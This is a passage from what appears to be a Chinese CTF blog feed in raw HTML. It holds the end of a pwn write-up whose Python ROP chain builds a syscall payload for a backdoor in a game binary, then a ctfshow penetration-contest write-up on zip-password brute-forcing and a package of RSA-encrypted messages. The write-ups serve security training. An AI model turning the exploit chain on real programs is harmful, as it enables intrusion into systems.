string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000401dac</span><span class="token punctuation">)</span> <span class="token comment"># syscall</span><span class="token keyword">print</span><span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span><span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">0x70</span><span class="token operator">+</span><span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token operator">+</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>手动玩贪吃蛇到2分后，q退出跳转到后门函数，打入payload即可</p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250110115102546.png" alt="image-20250110115102546"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;不知道啊，听说在海南打就去了（&lt;/p&gt;</summary>
    
    
    
    <category term="线下赛" scheme="http://c1oudfl0w0.github.io/blog/categories/%E7%BA%BF%E4%B8%8B%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>ctfshow元旦渗透赛</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/</id>
    <published>2024-12-31T11:58:52.000Z</published>
    <updated>2025-01-13T16:36:12.392Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>马上就要期末考但还是来打了，给3-1困了好几天，还好最后没挂科（</p><p>官方wp：<a href="https://ysynrh77rj.feishu.cn/docx/F3nJdGJHjo1DSBx8c2TcecLrnvh">https://ysynrh77rj.feishu.cn/docx/F3nJdGJHjo1DSBx8c2TcecLrnvh</a></p><span id="more"></span><hr><h1 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h1><h2 id="启程"><a href="#启程" class="headerlink" title="启程"></a>启程</h2><p><del>出师未捷身先死</del></p><p>hint：</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">6332468885045739207798242375080077355892316665891880211715759509399402551400860520908019724111820758062002779222649162563769520681049420842627327653028697570023368621511584229066629851913921934625112891871237543378546847020163969961987899081707281756262252814062564762160798635747507687871699694751527174309034601497055974635051437994874886300646949625353558253782655181334148321351659981250042829128658958363792059338950291542877888243170008437712513314359394103899575725527464109331033472122605333514068765847981281168351027057708345483333279522044142183133967673483865459337003717067807320811287647328283988796540276949990614458889846521960577177616236664713902265004190473545460095268491900380558170082520224728576953003878275008182317199296267075737759724512554280591198406698260860277025465102137918643581832045307760200048667705365456953303241675697777911751700448120282274949664588640026605985924903540176391580279688363295982824196664632859001756744080268810527371486113951531943901306283561047843588041585812947331967034769134340552094418027084857234553229856544474009457347175105099512591554624971894599838746900995752415971119041937111084886165664866650538846290845643642053197978121486841730575238128406845555442419014173176404421806730649214788953146176851031811997323821914774362578122351737794097455302561907117362800799157551057036577218572856787471028581031618485255309875312810807897548663541884705879790370871272092175498582934779006508008372003215236813420967574992987533634390592255398695736558142823465028853521646032675657687007258165839140903999201766151183184688594176955338531845223421284906472573394877068730983517293944705652691178721839660327167016317868190701523720009185011216522451173878805968328968074937750042295853272548720830984864809212598178047616120161664500748924315852951589930193222279698129328148259041368119935965463251204093790728630387918548913200711797328676820417414861331435109809773835504522004547179742451417443447941411851982452178390931131018648260880134788113098629170784876904104322308416089636533044499374973277839771616505181221794837479001656285339681656874034743331472071702858650617822101028852441234915319854953097530971129078751008161174490025795476490498225822900160824277065484345528878744325480894129738333972010830499621263685185404636669845444451217075393389824619014562344105122537381743633355312869522701477652030663877906141024174678002699020634123988360384365275976070300277866252980082349473657<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>仔细看一下三行应该是代表n，p，q</p><p>还给了加密压缩包，不会misc，启程失败（</p><p>哎卧槽怎么是爆6位数字</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20241231203107904.png" alt="image-20241231203107904"></p><p>难绷</p><p>flag：<code>ctfshow&#123;654321&#125;</code></p><hr><h2 id="破解加密通讯"><a href="#破解加密通讯" class="headerlink" title="破解加密通讯"></a>破解加密通讯</h2><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20241231203318579.png" alt="image-20241231203318579"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">import</span> secretMessageResponse    <span class="token keyword">except</span> ImportError<span class="token punctuation">:</span>        <span class="token keyword">import</span> pip        pip<span class="token punctuation">.</span>main<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'install'</span><span class="token punctuation">,</span> <span class="token string">'secretMessageResponse'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">from</span> secretMessageResponse <span class="token keyword">import</span> printMessage<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个是所谓的特工保密的通讯手法</p><p>pip secretMessageResponse 库下来看看源码</p><p>printMessage.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token punctuation">,</span>datetimemessage <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"inputMessage_20241216"</span> <span class="token punctuation">:</span><span class="token triple-quoted-string string">'''gHgAsclUVPhWDv4S8Oa8SuRTDaj+V0dI4z2jrQwfvfSFWilWwMKwNULUI48UBLS2shZcm/yv2/e5Hq5VRDfXkdxCYQMdvdnvONtpm2yNiIaLpDV4Rs8fOXJ6kcaeT+mg4RkIIFgx35w4J1KgO72pSP8j1p+R9f9TNMafwJ91XmO4QTcOYkMKQMddKvhbyMXzJkSS0uZqEppNSIUnVX9b7m8PmMjV0uHShvb1Zc8UQWJWUJ3cOxwNasOeMQGxJrZXPkxIxDYzm3f0tXbCgvdgNZ8TQY7u+iCXjOtD6xnUsdSahnPq14BD30CilIfsG0r/klPHfxQ+psmHSX47Ylai0TtgfbHWJJ4lSo0ojMvTx6HYK8zmAoCmg4OGXDbv/IjJgYU1w24na0iXZCNtcjB9MLRNck00c20f/uS64Ss0Ixii8nmfsFOjQBCcIYN+HGmOnj5Uw8DVJrxlOmcfQciG3rzuIvYlbOdGMcyarTy2Ba7iZfoovYZObPscAwhNLWqbU4tuR78aOVxiXTFRY7+Y0x2eRT5sulcvB3vsKuDMlNrxaUgiFUohPBZGNsgQgyCPxxqk0NpUn0bbHLH+vBebjJxaim4AU28ctWW8xv7xpxVttb0EoohtK2cIHr79ep5XrU/rv4R58obD/o+QqI1Mrb4wwpX9tsL7ZbROw/MXJwM='''</span><span class="token punctuation">,</span>    <span class="token string">"inputMessage_20240411"</span> <span class="token punctuation">:</span> <span class="token triple-quoted-string string">'''Z93Khatj+AWZcpPwIqu8LzbJ8xb8CuVMI8okE0qwoQD2IC2lixg77mJZireOrbW7zFkDsk1hP67dROJZwVUDrYot2g5GxX/xy7lGjIblUX4iJVUtP4mHqZUgKROaLoh/gippMpP+8Ik2X/QRBx5gdhq0xam+wuVC+77/tyu8Fd/DohKbAMp8aaJsFr/W4mLDZ1gv4JK+2O3l+bAvpodBRTzb0ld5zD2ueYvjTudoDjdanQP1oVTH7pkDO2Vb+SsdIyTi2C410JEOF4Qm8mzVHtiOunOcLVpAlQsM6/LdhqsTNelXl/Myb84NGxwGWVmx6j2QejiL7S1hHeHlmQ9ExHeURPdZAvKhgMCemYXu3BGlFq3ydb5SkqwLFvM4vJ6XUBcWkHT8eijBFF6Y7YgOv9GRvBTnsAQhUBp4W4EAMtXkDdToG+S8ZO7El8Gh8jaWC49n5CuUBRz3z2GeOVbsBamfLV06IO5v78jGHXig4saEFKHvYSIGewyUCVQEGoIR5xOTJBTUTePAdvQjfg28vZZxFB/hIYNDUHkaek1Mg1UH5HWGgsCX1In5hSX/9eBkznEhzeWnJ1yMsYkj+ddN34DLQSrHc83geXMcoW3Ah3cAQG8E8bszvKL3hme+T5rOeENjkOAgYhf84k4YlxDskdwvzyu8HkE9CSaBpDP6lKI='''</span><span class="token punctuation">,</span>    <span class="token string">"inputMessage_20240305"</span> <span class="token punctuation">:</span> <span class="token triple-quoted-string string">'''ckDSthpl5DDJMpBE26Jqk8EjaSq7MUntdwLHPouwx6D38un6WQfLJ9wgDyjh9GA/ICJR7WrwWsVinr6y3u9w+ubMZ0mqmtnphzQraagk8NkKc1u1+qGp8llsud3C8mvJWa4GYa9KEhnACDHwppPKJDCfr1HKwPbR0NIi+1Aunmy6DeOKRkFwysnrSco5QiiC9+gdXFhQDmN9KEiYW6Pc3mWVbqFiJgRW3/Df6638oGPm6AUcgRnEWMKiluyN81frM9VNtCeJ64YrU6Rgx4D153YxNNQbLTcyCQMamHTrJnhxPojkuDqbEcU+iiN4offwrQyr4eEu9ecvmyD2w/n7pAOsVnqSzroBujVA+CK6Zq8Uie15mL5yWG9hD5ZcbSwnRmtqK3yl0Xl91hgn1JqcIEKtf+MnMQPr80uoxT3mz8IX8pyVnyyw1x6F+IK1I2G+5w6rUDjhzIbME5XB9hopwcswsXrMo9PP6/5Sz1noJrsu6k6WN8ZM0MyRIav+xuKP1+cYzlPSQZrMo3L4ieHQnBbsoyzGVf9QONMwaooGOrxu88ZWlGe8e7eyCzteeNSVOC2zqtQiwQJIgfp2UwTymA/cEjOICWVzUXwbE5wWUBPCLp2C/XWc82byrOHAFXHLOVKgolVToUpZ5uOvizgk/ahaxdGxGa9CrRyr6sf+goA='''</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">printMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> key<span class="token punctuation">,</span> value <span class="token keyword">in</span> message<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        title <span class="token operator">=</span> key<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'inputMessage_'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m"</span> <span class="token operator">+</span> <span class="token string">"请使用组织分配的私钥解密后使用"</span> <span class="token operator">+</span> <span class="token string">"\033[0m"</span><span class="token punctuation">)</span>        title <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span>title<span class="token punctuation">,</span> <span class="token string">'%Y%m%d'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y-%m-%d'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"----------------------------------------------------------"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>title<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"----------------------------------------------------------"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token comment"># 最新流通公钥</span><span class="token keyword">def</span> <span class="token function">getPublicKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token triple-quoted-string string">b'''    -----BEGIN PUBLIC KEY-----MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAmziayo9Tddo1FYdrtOswyjLYJ5frYKEwm4rQTsKU8UcdnnDRgms+ZmStoqlH/qi6x+D1K3fvvioCnGZLFHZwBUqbgT5x+qUmUaVMll9FOT7ZJ05w8n8Ljqa1akzFMU5G7YbCr3vQwN63vwvD9/63TDbXkJrv1fGl2rHpPwp5OPCUeCB3nIFIRCWHpJU7sHJqIP5vzV8KNJtbxgR+dhszdg+NhoBDUpxoVN5lzSKr2TMOLFLZaQR9AWOV/aHV8gjTkTLDZfc+XlfhxiDMTQdiUTbk/tynpt+JFrDA8vL5/TOmuxgumqgXZIPGrIUbwloTYyHD/XXmvXu5KE8g3eMKgxNxuEKM5bMTESBK9A7Q2Kj3eNp0Rvb5Aleg7h8/YbQemGelY/o5xpUyHgHjsfNQ3j/xhdhVCNVaXZF64V/YVpvC9Cq29F7qI+bl6FlN7zSpuHB3QgNS1uXOmjBCsA7ypZoWmdXeaLIO+I3kP48BBSmue4nidJifiK/kSOcZ0iegRXV1hyZ6pYdDE7hM5V5t5tvayJ31zRQNT2ALAFeCDozVWELHTnphkPkQO+SOPglrVz0S1dXicqRofXWMj7PJOFkBpWIX0aywMIh1woEAawUs3RM2pfLUNtqUTfodSCmWlwcpGrBWG5NACx7csPFtzWn8oPZfzL346at5DDIwD2kCAwEAAQ==-----END PUBLIC KEY-----'''</span><span class="token keyword">def</span> <span class="token function">enctryptMessage</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">import</span> base64    message_bytes <span class="token operator">=</span> message<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>      message_base64 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>message_bytes<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    publicKey <span class="token operator">=</span> getPublicKey<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>backends <span class="token keyword">import</span> default_backend    <span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives <span class="token keyword">import</span> serialization    <span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives<span class="token punctuation">.</span>asymmetric <span class="token keyword">import</span> padding    <span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives <span class="token keyword">import</span> hashes    public_key <span class="token operator">=</span> serialization<span class="token punctuation">.</span>load_pem_public_key<span class="token punctuation">(</span>publicKey<span class="token punctuation">,</span> backend<span class="token operator">=</span>default_backend<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    encrypted <span class="token operator">=</span> public_key<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>        message_base64<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        padding<span class="token punctuation">.</span>OAEP<span class="token punctuation">(</span>            mgf<span class="token operator">=</span>padding<span class="token punctuation">.</span>MGF1<span class="token punctuation">(</span>algorithm<span class="token operator">=</span>hashes<span class="token punctuation">.</span>SHA256<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            algorithm<span class="token operator">=</span>hashes<span class="token punctuation">.</span>SHA256<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            label<span class="token operator">=</span><span class="token boolean">None</span>        <span class="token punctuation">)</span>    <span class="token punctuation">)</span>    encrypted_base64 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> encrypted_base64printMessage<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么我们尝试调用一下这个 printMessage</p><p>直接执行<code>from secretMessageResponse import printMessage</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">请使用组织分配的私钥解密后使用<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token number">2024</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">16</span>gHgAsclUVPhWDv4S8Oa8SuRTDaj<span class="token operator">+</span>V0dI4z2jrQwfvfSFWilWwMKwNULUI48UBLS2shZcm<span class="token operator">/</span>yv2<span class="token operator">/</span>e5Hq5VRDfXkdxCYQMdvdnvONtpm2yNiIaLpDV4Rs8fOXJ6kcaeT<span class="token operator">+</span>mg4RkIIFgx35w4J1KgO72pSP8j1p<span class="token operator">+</span>R9f9TNMafwJ91XmO4QTcOYkMKQMddKvhbyMXzJkSS0uZqEppNSIUnVX9b7m8PmMjV0uHShvb1Zc8UQWJWUJ3cOxwNasOeMQGxJrZXPkxIxDYzm3f0tXbCgvdgNZ8TQY7u<span class="token operator">+</span>iCXjOtD6xnUsdSahnPq14BD30CilIfsG0r<span class="token operator">/</span>klPHfxQ<span class="token operator">+</span>psmHSX47Ylai0TtgfbHWJJ4lSo0ojMvTx6HYK8zmAoCmg4OGXDbv<span class="token operator">/</span>IjJgYU1w24na0iXZCNtcjB9MLRNck00c20f<span class="token operator">/</span>uS64Ss0Ixii8nmfsFOjQBCcIYN<span class="token operator">+</span>HGmOnj5Uw8DVJrxlOmcfQciG3rzuIvYlbOdGMcyarTy2Ba7iZfoovYZObPscAwhNLWqbU4tuR78aOVxiXTFRY7<span class="token operator">+</span>Y0x2eRT5sulcvB3vsKuDMlNrxaUgiFUohPBZGNsgQgyCPxxqk0NpUn0bbHLH<span class="token operator">+</span>vBebjJxaim4AU28ctWW8xv7xpxVttb0EoohtK2cIHr79ep5XrU<span class="token operator">/</span>rv4R58obD<span class="token operator">/</span>o<span class="token operator">+</span>QqI1Mrb4wwpX9tsL7ZbROw<span class="token operator">/</span>MXJwM<span class="token operator">=</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>请使用组织分配的私钥解密后使用<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token number">2024</span><span class="token operator">-</span><span class="token number">04</span><span class="token operator">-</span><span class="token number">11</span>Z93Khatj<span class="token operator">+</span>AWZcpPwIqu8LzbJ8xb8CuVMI8okE0qwoQD2IC2lixg77mJZireOrbW7zFkDsk1hP67dROJZwVUDrYot2g5GxX<span class="token operator">/</span>xy7lGjIblUX4iJVUtP4mHqZUgKROaLoh<span class="token operator">/</span>gippMpP<span class="token operator">+</span>8Ik2X<span class="token operator">/</span>QRBx5gdhq0xam<span class="token operator">+</span>wuVC<span class="token operator">+</span><span class="token number">77</span><span class="token operator">/</span>tyu8Fd<span class="token operator">/</span>DohKbAMp8aaJsFr<span class="token operator">/</span>W4mLDZ1gv4JK<span class="token operator">+</span>2O3l<span class="token 